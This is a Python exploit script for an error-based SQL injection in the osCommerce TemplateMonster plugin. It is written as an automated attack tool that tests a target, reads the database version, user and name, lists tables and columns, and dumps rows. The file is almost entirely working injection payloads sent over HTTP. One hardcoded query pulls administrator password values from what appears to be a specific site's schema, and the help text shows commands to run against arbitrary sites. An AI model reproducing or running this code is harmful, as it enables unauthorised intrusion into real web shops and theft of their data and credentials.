#!/usr/bin/python
#osCommerce TemplateMonster plugin Error-based SQL Injection exploit
#author security007

import requests
import re
import sys
import os
import argparse
class warna :
	HIJAU = '\033[92m'
	KUNING = '\033[33m'
	MERAH = '\033[31m'
	BIRU = '\033[94m'
	TUTUP = '\033[00m'
	
hijau = warna.HIJAU
kuning = warna.KUNING
merah = warna.MERAH
biru = warna.BIRU
tutup =warna.TUTUP

def data(url,database,tables,columns):	
	pattern = "Duplicate entry ':(.*?):1' for key 'group_key'"
	tes = "AND (SELECT 1361 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT MID((IFNULL(CAST(user_password AS CHAR),0x20)),1,54) FROM mrsnus_mrsnus.administrators ORDER BY user_password LIMIT 0,1),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)# zOzT"
	jumdat = []
	data = []
	if (re.search(",",columns) != None):
		a = columns.split(",")
		print merah+"[x] Error based can not retreive "+str(len(a))+" data at the same time"+tutup
		print kuning+"[-] Try -C "+a[0]+tutup
		sys.exit()
	print hijau+"[!] Checking data in columns"+tutup
	for carjum in range(0,101):
		req = requests.get(url+"+AND (SELECT 1361 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT MID((IFNULL(CAST("+columns+" AS CHAR),0x20)),1,54) FROM "+database+"."+tables+" ORDER BY "+columns+" LIMIT "+str(carjum)+",1),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)# zOzT").text		
		print hijau+"[+] Count data ["+str(carjum)+"]"+tutup
		if (re.search("Duplicate entry",req) == None): 
			jumdat.append(carjum)
			break
		else:
			for x in re.findall(pattern,req):
				data.append(x)
	if (len(jumdat) == 0):
		print merah+"[-] Sorry no columns found, maybe you can inject it manual"+tutup
		print kuning+"[Payload] +AND (SELECT 1361 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT MID((IFNULL(CAST("+columns+" AS CHAR),0x20)),1,54) FROM "+database+"."+tables+" ORDER BY "+columns+" LIMIT 0,1),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)# zOzT"+tutup		
	#perlihatkan kolom jika ada
	else:
		print "-------------=========["+columns+"]=========----------------"
		print "[+] Found "+str(jumdat[0])+" data"
		for colm in data:
			print "[data] "+colm
		print "-------------=========[Data]=========----------------"

def columns(url,tables):
	pattern = "Duplicate entry '(.+?)~1' for key 'group_key'"
	jumcol = []
	columns = []
	#cek jumlah kolom
	print hijau+"[!] Checking column in tables"+tutup
	for column in range(0,101):
		req = requests.get(url+"+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(column_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+table_name=0x"+tables.encode('hex')+"+AND+table_schema=DATABASE()+LIMIT+"+str(column)+",1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)").text
		print hijau+"[+] Count columns ["+str(column)+"]"+tutup
		if (re.search("Duplicate entry",req) == None): 
			jumcol.append(column)
			break
		else:
			for x in re.findall(pattern,req):
				columns.append(x)
	#jika tidak ada kolom maka
	if (len(jumcol) == 0 or jumcol[0] == 0):
		print merah+"[-] Sorry no columns found, maybe you can inject it manual"+tutup
		print kuning+"[Payload] +AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(column_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+table_name=0x62616e6e6572735f686973746f7279+AND+table_schema=DATABASE()+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)"+tutup
		sys.exit()
	#perlihatkan kolom jika ada
	else:
		print "-------------=========[Columns]=========----------------"
		print "[+] Found "+str(jumcol[0])+" columns"
		for colm in columns:
			print "[columns] "+colm
		print "-------------=========[Tables]=========----------------"
def tables(url):
	pattern = "Duplicate entry '(.+?)~1' for key 'group_key'"
	jumtab = []
	tables = []
	#cek jumlah table
	print biru+"[!] Checking tables in database"+tutup
	for table in range(101):
		req = requests.get(url+"+AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(table_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=DATABASE()+LIMIT+"+str(table)+",1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)").text
		print hijau+"[+] Count tables ["+str(table)+"]"+tutup
		if (re.search("Duplicate entry",req) == None): 			
			jumtab.append(table)
			break
		else:
			for x in re.findall(pattern,req):
				tables.append(x)
	#jika tidak ada table maka
	if (len(jumtab) == 0 or jumtab[0] == 0):
		print merah+"[-] Sorry no tables found, maybe you can inject it manual"+tutup
		print kuning+"[Payload] +AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(table_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=DATABASE()+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)"
		sys.exit()
	#perlihatkan tables jika ada
	else:
		print "-------------=========[Tables]=========----------------"
		print "[+] Found "+str(jumtab[0])+" tables"
		for tabl in tables:
			print "[Tables] "+tabl
	print "-------------=========[Tables]=========----------------"	
def info(url):
	VERSION = "+OR+1+GROUP+BY+CONCAT_WS(0x3a,VERSION(),FLOOR(RAND(0)*2))+HAVING+MIN(0)+OR+1"
	DATABASE = "+OR+1+GROUP+BY+CONCAT_WS(0x3a,DATABASE(),FLOOR(RAND(0)*2))+HAVING+MIN(0)+OR+1"
	USER = "+OR+1+GROUP+BY+CONCAT_WS(0x3a,USER(),FLOOR(RAND(0)*2))+HAVING+MIN(0)+OR+1"
	print biru+"[!] Get database version"+tutup
	req = requests.get(url+VERSION).text	
	cekversion = re.findall("Duplicate entry '(.+?):1' for key 'group_key'",req)
	print biru+"[!] Get database name"+tutup
	req2 = requests.get(url+DATABASE).text
	cekdatabase = re.findall("Duplicate entry '(.+?):1' for key 'group_key'",req2)
	print biru+"[!] Get database user\n"+tutup
	req3 = requests.get(url+USER).text
	cekuser = re.findall("Duplicate entry '(.+?):1' for key 'group_key'",req3)
	if (len(cekversion) != 0):
		print "------------=========[Info]========--------------"
		print "[+] Version : "+cekversion[0]
	else:
		print merah+"[-] Can't resolve database version"+tutup
	if (len(cekdatabase) != 0):
		print "[+] Database : "+cekdatabase[0]
	else:
		print merah+"[-] Can't resolve database name"+tutup
	if (len(cekuser) != 0):
		print "[+] User : "+cekuser[0]
		print "------------=========[Info]========--------------"
	else:
		print merah+"[-] Can't resolve database user"+tutup
		
def cek(url):
	TES = "+OR+1+GROUP+BY+CONCAT_WS(0x3a,0x2756754c6e457241624c6527,FLOOR(RAND(0)*2))+HAVING+MIN(0)+OR+1"
	print biru+"[!] Checking "+url+tutup
	cekurl = re.search(".php?",url)
	if (cekurl == None):
		print kuning+"[x] No parameter in url"+tutup
		sys.exit()
	req = requests.get(url+TES).text
	cekvuln = re.findall("Duplicate entry ''(.+?)':1' for key 'group_key'",req)
	if (len(cekvuln) != 0 and cekvuln[0] == "VuLnErAbLe"):
		print hijau+"[+] Found string 'VuLnErAbLe' "+tutup
		print hijau+"[+] Target is vulnerable"+tutup
	else:
		print merah+"[x] Target is not vulnerable"+tutup
		sys.exit()

def help():
	print """
Usage : python osComSql.py -u [target] [options]
Options:
-u [target]        Target Host
-T [Table name]    Nama Target  
-C [Column name]   Nama Kolom
-C [Nama database] Nama Database
--test             Testing target
--database         Show Database Name
--tables           Show Tables
--columns          Show Columns
--dump             Dump Data

Example:
python osComSql.py -u http://xnxx.com --test
python osComSql.py -u http://xnxx.com --tables
python osComSql.py -u http://xnxx.com -T tablename --columns
python osComSql.py -u http://xnxx.com -T tablename -C columnname,columnname --dump

"""

def main():
	banner = """
                      /$$$$$$                                                                               
                     /$$__  $$                                                                              
  /$$$$$$   /$$$$$$$| $$  \__/  /$$$$$$  /$$$$$$/$$$$  /$$$$$$/$$$$   /$$$$$$   /$$$$$$   /$$$$$$$  /$$$$$$ 
 /$$__  $$ /$$_____/| $$       /$$__  $$| $$_  $$_  $$| $$_  $$_  $$ /$$__  $$ /$$__  $$ /$$_____/ /$$__  $$
| $$  \ $$|  $$$$$$ | $$      | $$  \ $$| $$ \ $$ \ $$| $$ \ $$ \ $$| $$$$$$$$| $$  \__/| $$      | $$$$$$$$
| $$  | $$ \____  $$| $$    $$| $$  | $$| $$ | $$ | $$| $$ | $$ | $$| $$_____/| $$      | $$      | $$_____/
|  $$$$$$/ /$$$$$$$/|  $$$$$$/|  $$$$$$/| $$ | $$ | $$| $$ | $$ | $$|  $$$$$$$| $$      |  $$$$$$$|  $$$$$$$
 \______/ |_______/  \______/  \______/ |__/ |__/ |__/|__/ |__/ |__/ \_______/|__/       \_______/ \_______/
                                                       TemplateMonster plugin Error-based SQL Injection exploit
                                                       Author : Security007
													   """
	print biru+banner+tutup
	
	if (len(sys.argv)==4 and sys.argv[1] == "-u" and sys.argv[3] == "--test"):#test host
		host = sys.argv[2]
		cek(host)
		info(host)
	elif (len(sys.argv)==2 and sys.argv[1] == "-h"):
		help()
	elif (len(sys.argv)==4 and sys.argv[1] == "-u" and sys.argv[3] == "--tables"):#show tables
		url = sys.argv[2]
		tables(url)
	elif (len(sys.argv)==6 and sys.argv[1] == "-u" and sys.argv[3] == "-T" and sys.argv[5] == "--columns"):#show columns
		ur = sys.argv[2]
		table = sys.argv[4]
		columns(ur,table)
	elif (len(sys.argv)==10 and sys.argv[1] == "-u" and sys.argv[3] == "-D" and sys.argv[5] == "-T" and sys.argv[7] == "-C" and sys.argv[9] == "--dump"):#dump data
		host = sys.argv[2]
		db = sys.argv[4]
		table = sys.argv[6]
		column = sys.argv[8]
		data(host,db,table,column)
	else:
		print kuning+"[-] Missing option"+tutup
		help()

if __name__ == "__main__":
	main()
		